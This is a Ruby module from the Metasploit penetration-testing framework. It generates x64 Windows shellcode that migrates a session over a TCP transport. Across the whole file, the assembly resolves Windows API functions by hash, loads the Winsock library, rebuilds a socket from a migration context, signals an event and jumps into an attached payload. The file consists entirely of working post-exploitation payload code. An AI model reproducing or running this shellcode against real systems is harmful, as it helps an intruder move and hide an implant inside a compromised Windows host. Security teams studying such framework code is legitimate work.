# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/x64/block_api'

module Msf

###
#
# Payload that supports migrating over TCP transports on x64.
#
###

module Payload::Windows::MigrateTcp_x64

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi_x64

  WSA_DATA_SIZE = 408

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Migrate over TCP transport (x64)',
      'Description'   => 'Migration stub to use over TCP transports (x64)',
      'Author'        => ['OJ Reeves'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86_64,
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    asm = %Q^
    migrate:
      cld
      mov rsi, rcx
      sub rsp, 0x2000
      and rsp, ~0xF
      call start
      #{asm_block_api}
    start:
      pop rbp
    load_ws2_32:
      mov r14, 'ws2_32'
      push r14
      mov rcx, rsp              ; pointer to 'ws2_32'
      sub rsp, #{WSA_DATA_SIZE}+8            ; alloc size, plus alignment
      mov r13, rsp              ; save pointer to the struct
      sub rsp, 0x28             ; space for function calls (really?)
      mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
      call rbp                  ; LoadLibraryA('ws2_32')
    init_networking:
      mov rdx, r13              ; Pointer to wsadata struct
      push 2
      pop rcx                   ; version = 2
      mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
      call rbp                  ; WSAStartup(Version, &WSAData)
    create_socket:
      xor r8, r8                ; protocol not specified
      push r8                   ; flags == 0
      push r8                   ; reserved == NULL
      lea r9, [rsi+16]          ; Pointer to the info in the migration context
      push 1
      pop rdx                   ; SOCK_STREAM
      push 2
      pop rcx                   ; AF_INET
      mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
      call rbp                  ; WSASocketA(AF_INET, SOCK_STREAM, 0, &info, 0, 0)
      xchg rdi, rax
    signal_event:
      mov rcx, qword [rsi]      ; Event handle is pointed at by rsi
      mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
      call rbp                  ; SetEvent(handle)
    call_payload:
      call qword [rsi+8]        ; call the associated payload
    ^

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

end

end


